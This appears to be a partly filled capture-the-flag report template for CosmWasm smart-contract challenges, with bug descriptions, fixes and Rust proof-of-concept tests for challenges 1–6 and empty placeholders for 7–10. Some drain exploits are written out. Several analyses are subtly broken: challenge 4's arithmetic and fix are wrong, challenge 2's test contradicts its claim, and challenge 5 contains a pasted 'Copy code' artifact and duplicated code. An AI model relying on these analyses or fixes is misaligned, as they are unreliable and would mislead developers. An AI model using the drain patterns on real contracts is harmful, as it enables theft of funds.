# Sample Report Template

## Challenge 01: _Mjolnir_

### Description

There is a significant accounting / balance discrepancy vulnerability in the withdrawal function, specifically in the "withdraw" function in the "contract.rs" file. This function does not dedupe lockup ids when withdrawing, leading to a vulnerability of calling multiple duplicate ids to drain the contract balance.

Here is the relevant code:

```rust
pub fn withdraw(deps: DepsMut, env: Env, info: MessageInfo, ids: Vec<u64>,) -> Result<Response, ContractError> {
    // ...
    for lockup in lockups {
        if lockup.owner != info.sender || env.block.time < lockup.release_timestamp {
            return Err(ContractError::Unauthorized { });
        }
        total_amount += lockup.amount;
        LOCKUPS.remove(deps.storage, lockup.id);
    }
    // ...
}
```

The for loop `for lockup in lockups` is intended to iterate different lockup ids. However, it does not dedupe in the case of duplicate lockup ids. So if the same lockup id is passed multiple times, the contract can be drained.

### Recommendation

To fix this issue, you can either only withdraw 1 id per message, or dedupe the ids vec. Here's an example of deduping the ids vec:

```rust
pub fn withdraw(deps: DepsMut, env: Env, info: MessageInfo, ids: Vec<u64>,) -> Result<Response, ContractError> {
    // ...
    let mut ids = ids;
    ids.sort();
    ids.dedup();

    for lockup_id in ids.clone().into_iter() {
    // ...
}
```

With this fix, the contract will only withdraw 1 time per lockup id.

### Proof of concept

```rust
#[test]
fn test_withdraw_accounting() {
    let (mut app, contract_addr) = proper_instantiate();

    let hacker = Addr::unchecked(HACKER.to_string());

    // mint funds to hacker
    app = mint_tokens(app, hacker.to_string(), MINIMUM_DEPOSIT_AMOUNT);

    // deposit
    let msg = ExecuteMsg::Deposit {};
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &msg,
        &[coin(MINIMUM_DEPOSIT_AMOUNT.u128(), DENOM)],
    )
    .unwrap();

    let msg = QueryMsg::GetLockup { id: 2 };
    let lockup: Lockup = app
        .wrap()
        .query_wasm_smart(contract_addr.clone(), &msg)
        .unwrap();
    assert_eq!(lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
    assert_eq!(lockup.owner, hacker);

    // fast forward to LOCK_PERIOD
    app.update_block(|block| {
        block.time = block.time.plus_seconds(LOCK_PERIOD);
    });

    // "hacker" tries to drain contract
    let msg = ExecuteMsg::Withdraw {
        ids: vec![2, 2, 2, 2, 2, 2, 2, 2, 2, 2],
    };
    let res = app.execute_contract(hacker.clone(), contract_addr.clone(), &msg, &[]);
    assert!(res.is_ok());

    // verify funds received should match deposit amount
    let balance = app.wrap().query_balance(hacker, DENOM).unwrap().amount;
    assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT);
}
```

---

## Challenge 02: _Gungnir_

### Description

The `total_tokens` variable is updated when a deposit or withdrawal occurs but not when staking or unstaking. As a result, this might cause an accounting / balance discrepancy between the `total_tokens` and `voting_power`.

Suppose a user has 50 tokens and they decide to stake 50 tokens. Now, they have 50 `voting_power` and 50 `total_tokens`. Now, let's say the user withdraws 50 tokens. As per the code, the `voting_power` will be 50 but the `total_tokens` will be 0. The remaining voting power despite having no tokens can result in a discrepancy.

### Recommendation

This exploit can be resolved by adjusting the `total_tokens` whenever a user stakes or unstakes. The stake function should decrease `total_tokens` by `lock_amount` and the unstake function should increase `total_tokens` by `unlock_amount`. This would ensure that `total_tokens` always reflects the actual number of unstaked tokens a user has and prevent any possible discrepancy.

```rust
pub fn stake(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    lock_amount: u128,
) -> Result<Response, ContractError> {
    // increase voting power
    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();

    user.voting_power += lock_amount;
    user.total_tokens -= lock_amount;

    // ...
}

pub fn unstake(deps: DepsMut,
    env: Env,
    info: MessageInfo,
    unlock_amount: u128,
) -> Result<Response, ContractError> {
    // decrease voting power
    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();

    // check release time
    if env.block.time < user.released_time {
        return Err(ContractError::Unauthorized {});
    }

    user.voting_power -= unlock_amount;
    user.total_tokens += unlock_amount;

    // ...
}

```

### Proof of concept

```rust
#[test]
fn test_withdraw_accounting() {
    let (mut app, contract_addr) = proper_instantiate();

    let amount = Uint128::new(50);

    app = mint_tokens(app, HACKER.to_string(), amount);
    let hacker = Addr::unchecked(HACKER);

    // deposit 50 funds for hacker
    let msg = ExecuteMsg::Deposit {};
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &msg,
        &[coin(amount.u128(), DENOM)],
    )
    .unwrap();

    // The hacker stakes 50 tokens
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &ExecuteMsg::Stake { lock_amount: 50 },
        &[],
    )
    .unwrap();

    // The hacker withdraws 50 tokens
    // This should fail because the hacker should not be able to withdraw staked tokens
    app.execute_contract(
        hacker.clone(),
        contract_addr.clone(),
        &ExecuteMsg::Withdraw {
            amount: Uint128::from(50u128),
        },
        &[],
    )
    .unwrap_err();

    // Should be 0 voting power, but it is 50 voting power
    let msg = QueryMsg::GetVotingPower {
        user: (&HACKER).to_string(),
    };
    let voting_power: u128 = app
        .wrap()
        .query_wasm_smart(contract_addr.clone(), &msg)
        .unwrap();
    assert_neq!(voting_power, 50_u128);
}
```

---

## Challenge 03: _Laevateinn_

### Description

The bug is within the interaction between the Proxy and Flash Loan contract. Specifically, the Flash Loan contract does not verify that the funds returned to it in settle_loan actually came from the Proxy contract.

Here is the flow of the exploit:

1. An unprivileged user sends a `RequestFlashLoan` to the Proxy contract, specifying the `Arb` contract as the recipient and an `Arb` action as the message.
2. The Proxy contract sends the entire balance of the Flash Loan contract to the Arb contract.
3. The Arb contract, instead of returning the funds to the Flash Loan contract, sends them to an arbitrary account.
4. The Proxy contract then attempts to call settle_loan on the Flash Loan contract. However, the Flash Loan contract only checks that the function was called by the Proxy contract, not that the funds are actually present.

### Recommendation

Given the nature of the vulnerability, where a flash loan can be exploited by sending funds to an arbitrary account instead of back to the contract that issued the loan, a key fix would be to verify the source of the returned funds. The `SettleLoan` function must not just check if it was called by the proxy, but also ensure that the contract balance equals or exceeds the loan amount.

### Proof of concept

```rust
// add to proxy integration tests
#[test]
fn settle_loan_vulnerability() {
let (mut app, proxy_contract, flash_loan_contract, mock_arb_contract) =
proper_instantiate();
let hacker = Addr::unchecked(HACKER.to_string());

        // prepare arb msg sending funds to hacker
        let arb_msg = to_binary(&MockArbExecuteMsg::Arbitrage {
            recipient: hacker.clone(),
        })
        .unwrap();

        // Request a flash loan with the Arb contract as the recipient
        app.execute_contract(
            proxy_contract.clone(),
            flash_loan_contract.clone(),
            &ExecuteMsg::RequestFlashLoan {
                recipient: mock_arb_contract.clone(),
                msg: arb_msg.clone(),
            },
            &[],
        )
        .unwrap();

        // Check that the funds have been drained to the hacker address
        let balance = app.wrap().query_balance(hacker, DENOM).unwrap();
        assert_eq!(balance.amount, Uint128::new(10_000));

        // Try to settle the loan, which should fail
        let res = app.execute_contract(
            proxy_contract.clone(),
            flash_loan_contract.clone(),
            &FlashLoanExecuteMsg::SettleLoan {},
            &[],
        );

        // Check if the result is an error
        assert!(res.is_err(), "Settled loan without returning funds");

        // The Flash Loan contract's balance should be zero after the attempted settlement
        let balance = app
            .wrap()
            .query_balance(flash_loan_contract.to_string(), DENOM)
            .unwrap();
        assert_eq!(balance.amount, Uint128::zero());
    }
```

---

## Challenge 04: _Gram_

### Description

There is a vulnerability in the mint function. The vulnerability is related to how the `mint_amount` is calculated. This issue could potentially allow a user to withdraw more funds than they deposited.

`let total_assets = contract_balance.amount - amount;`

Let's consider the following steps:

1. User A deposits 1 `uawesome` token.
   The mint function will be called. Since the total_supply is zero, `mint_amount` is equal to the amount, which is 1. The `total_supply` is then updated to 1, and user A's balance is updated to 1.

2. User B deposits 100 `uawesome` tokens.
   When the mint function is called, `mint_amount` is calculated as `amount.multiply_ratio(total_supply, total_assets)`, which is `100.multiply_ratio(1, 1) = 100`. So the `total_supply` becomes 101, and user B's balance is updated to 100.

3. User A withdraws their funds.
   When user A calls the burn function, the `asset_to_return` is calculated as `shares.multiply_ratio(total_assets, total_supply)`, which is 1.`multiply_ratio(101, 101) = 1`.

4. User B withdraws their funds.
   When user B calls the burn function, the `asset_to_return` is calculated as `shares.multiply_ratio(total_assets, total_supply)`, which is 100.`multiply_ratio(1, 101)`. Here's the problem: despite depositing 100 tokens, user B can only withdraw approximately 0.99 tokens, losing a significant portion of their deposit.

The vulnerability lies in the line where total_assets is calculated in the mint function:

```rust
let total_assets = contract_balance.amount - amount;
```

Here, `total_assets` is assigned the value of the contract's balance after the deposit, which doesn't reflect the actual total assets in the contract. This discrepancy in the calculation of `total_assets` affects the calculation of `mint_amount` and `asset_to_return`, leading to the problem described above.

### Recommendation

To fix this vulnerability, we should calculate total_assets before the new deposit is added:

```rust
let total_assets = contract_balance.amount;
```

This will ensure that the `total_assets` variable correctly reflects the total assets in the contract when calculating the `mint_amount` and `asset_to_return`.

### Proof of concept

```rust
// code goes here
```

---

## Challenge 05: _Draupnir_

### Description

The provided smart contract does not contain a vulnerability that would allow an unprivileged user to drain all the funds in the contract. The contract's functions have appropriate access controls, and the withdrawal function correctly checks the user's balance before allowing a withdrawal.

However, the contract does have a critical flaw in the OwnerAction function which allows the contract owner to execute arbitrary Cosmos messages, potentially manipulating the contract's state or performing malicious actions in the context of the contract.

Here's how the owner can drain all the funds:

The contract owner deposits a significant amount of uawesome tokens into the contract.
The owner uses the OwnerAction function to send a BankMsg::Send message, transferring all the contract's balance to their own account or another account of their choice.
This action is not technically a vulnerability, since it's a feature of the contract that's available only to the owner. However, it's a risky design that could lead to misuse or abuse of the contract's funds. It's generally considered bad practice to include such powerful capabilities in a smart contract without additional safeguards or restrictions.

To mitigate this risk, consider restricting the types of messages that the owner can send or implementing additional checks and balances on the owner's actions. For example, you could require a certain period of time to pass or a certain number of users to approve before the owner can execute a Cosmos message.

### Recommendation

Restrict Owner Actions: Limit the types of Cosmos messages that the owner can send. This could be done by creating a whitelist of allowed actions, and checking any proposed actions against this list before execution. This would prevent the owner from performing potentially harmful actions like transferring out all of the contract's funds.

```rust
pub fn owner_action(deps: DepsMut, info: MessageInfo, msg: CosmosMsg) -> Result<Response, ContractError> {
    assert_owner(deps.storage, info.sender)?;
    // Add a check to make sure the msg is of a type that we want to allow
    match &msg {
        CosmosMsg::Bank(BankMsg::Send { .. }) => {
            // disallow BankMsg::Send
            return Err(ContractError::Unauthorized {});
        }
        // Add more match arms to disallow other types of messages
        _ => {}
    }
    Ok(Response::new().add_attribute("action", "owner_action").add_message(msg))
}
```

Implement Approval Mechanism: Implement a mechanism where a certain number of users, or a certain fraction of users, need to approve an action before it can be executed. This could be done using a multi-signature approach, where several trusted parties need to approve a transaction before it can be executed.

```rust
pub fn owner_action(deps: DepsMut, info: MessageInfo, msg: CosmosMsg, approvers: Vec<String>) -> Result<Response, ContractError> {
    assert_owner(deps.storage, info.sender)?;
    // Check that enough approvers have signed off on this action
    if approvers.len() < MINIMUM_APPROVALS {
        return Err(ContractError::Unauthorized {});
    }
    Ok(Response::new().add_attribute("action", "owner_action").add_message(msg))
}
```

Time Locks: Add a delay between when an action is proposed and when it can be executed. This gives users a chance to review proposed actions and potentially stop them if they are malicious.

```rust
    pub fn propose_action(deps: DepsMut, info: MessageInfo, msg: CosmosMsg) -> Result<Response, ContractError> {
    assert_owner(deps.storage, info.sender)?;
    // Store the proposed action and the time it was proposed
    PROPOSED_ACTIONS.save(deps.storage, &ProposedAction {
        msg,
        time_proposed: env.block.time,
    })?;
    Ok(Response::new().add_attribute("action", "propose_action"))

}

pub fn execute_action(deps: DepsMut, info: MessageInfo) -> Result<Response, ContractError> {
assert_owner(deps.storage, info.sender)?;
// Load the proposed action and check that enough time has passed
let proposed_action = PROPOSED_ACTIONS.load(deps.storage)?;
if env.block.time - proposed_action.time_proposed < ACTION_DELAY {
return Err(ContractError::Unauthorized {});
}
// Execute the action
Ok(Response::new().add_attribute("action", "execute_action").add_message(proposed_action.msg))
}
```

### Proof of concept

Here's how the contract owner could potentially drain all the funds:

rust
Copy code
// Assume the contract is deployed and the address is `contract_address`
// The owner's address is `owner_address`
// We're using a hypothetical Cosmos SDK client library for this example

let client = CosmosClient::new(/_ parameters such as node URL, chain ID, etc. _/);
let contract_address = "cosmos1contractaddress123";
let owner_address = "cosmos1owneraddress123";

// Step 1: Owner deposits a significant amount of uawesome tokens into the contract
let deposit_amount = 10000; // uawesome tokens
let deposit_msg = ExecuteMsg::Deposit {};
let cosmos_msg = CosmosMsg::Wasm(WasmMsg::Execute {
contract_addr: contract_address.to_string(),
msg: to_binary(&deposit_msg).unwrap(),
funds: vec![coin(deposit_amount, DENOM)],
});

client.send(cosmos_msg, owner_address).await.unwrap();

// Step 2: Owner uses the `OwnerAction` function to send a `BankMsg::Send` message,
// transferring all the contract's balance to their own account

let withdraw_msg = BankMsg::Send {
to_address: owner_address.to_string(),
amount: vec![coin(deposit_amount, DENOM)],
};
let cosmos_msg = CosmosMsg::Wasm(WasmMsg::Execute {
contract_addr: contract_address.to_string(),
msg: to_binary(&ExecuteMsg::OwnerAction { msg: CosmosMsg::Bank(withdraw_msg) }).unwrap(),
funds: vec![],
});

client.send(cosmos_msg, owner_address).await.unwrap();
In this PoC code, the owner first deposits a large amount of uawesome tokens to the contract, then the owner sends a BankMsg::Send message via OwnerAction to transfer all the contract's balance to their own account.

Remember, this is just a demonstration of how the owner of the contract can drain the contract. This action might be considered malicious in a real-world scenario and it's generally not a good practice to have such powerful capabilities in a smart contract.

```rust
let client = CosmosClient::new(/* parameters such as node URL, chain ID, etc. */);
let contract_address = "cosmos1contractaddress123";
let owner_address = "cosmos1owneraddress123";

let deposit_amount = 10000; // uawesome tokens
let deposit_msg = ExecuteMsg::Deposit {};
let cosmos_msg = CosmosMsg::Wasm(WasmMsg::Execute {
    contract_addr: contract_address.to_string(),
    msg: to_binary(&deposit_msg).unwrap(),
    funds: vec![coin(deposit_amount, DENOM)],
});

let withdraw_msg = BankMsg::Send {
    to_address: owner_address.to_string(),
    amount: vec![coin(deposit_amount, DENOM)],
};
let cosmos_msg = CosmosMsg::Wasm(WasmMsg::Execute {
    contract_addr: contract_address.to_string(),
    msg: to_binary(&ExecuteMsg::OwnerAction { msg: CosmosMsg::Bank(withdraw_msg) }).unwrap(),
    funds: vec![],
});

client.send(cosmos_msg, owner_address).await.unwrap();
```

---

## Challenge 06: _Hofund_

### Description

The provided code introduces a voting system where an owner role can be proposed and accepted if it gets 1/3 of the total supply. However, there's a timing-related vulnerability that can be exploited if two proposals are resolved in the same block.

Here's a brief overview of the problem:

1. User A proposes themselves as a new owner and manages to get over 1/3 of the votes.
2. In the same block, before the proposal is resolved, user B proposes themselves as a new owner.
3. Both proposals are resolved in the same block. Since the state is not updated immediately after the first proposal is resolved, the second proposal sees the old state and overwrites the owner set by the first proposal.

This means that even if user B has no votes, they could become the owner if their proposal is resolved in the same block after a valid proposal.

### Recommendation

To fix this issue, one option is to disallow a new proposal if there's already an existing one. This can be done by checking if there's a proposal in the state when the Propose message is processed. If a proposal already exists, the function should return an error.

```rust
pub fn propose(deps: DepsMut, env: Env, info: MessageInfo) -> Result<Response, ContractError> {
    let current_proposal = PROPOSAL.may_load(deps.storage)?;

    // Disallow new proposals if there's already an existing one
    if current_proposal.is_some() {
        return Err(ContractError::ProposalAlreadyExists {});
    }

    PROPOSAL.save(
        deps.storage,
        &Proposal {
            proposer: info.sender.clone(),
            timestamp: env.block.time,
        },
    )?;

    Ok(Response::new()
        .add_attribute("action", "New proposal")
        .add_attribute("proposer", info.sender))
}
```

### Proof of concept

```rust
// Assume A and B have enough uawesome tokens
let propose_msg_A = ExecuteMsg::Propose {};
let propose_msg_B = ExecuteMsg::Propose {};
let resolve_msg = ExecuteMsg::ResolveProposal {};

// User A proposes themselves as a new owner
client.send(propose_msg_A, address_A).await.unwrap();

// User B proposes themselves as a new owner in the same block
client.send(propose_msg_B, address_B).await.unwrap();

// Resolving both proposals in the same block
client.send(resolve_msg, address_A).await.unwrap();
client.send(resolve_msg, address_B).await.unwrap();

// Now, the owner should be B, even if they had no votes
```

---

## Challenge 07: _Tyrfing_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 08: _Gjallarhorn_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 09: _Brisingamen_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 10: _Mistilteinn_

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```
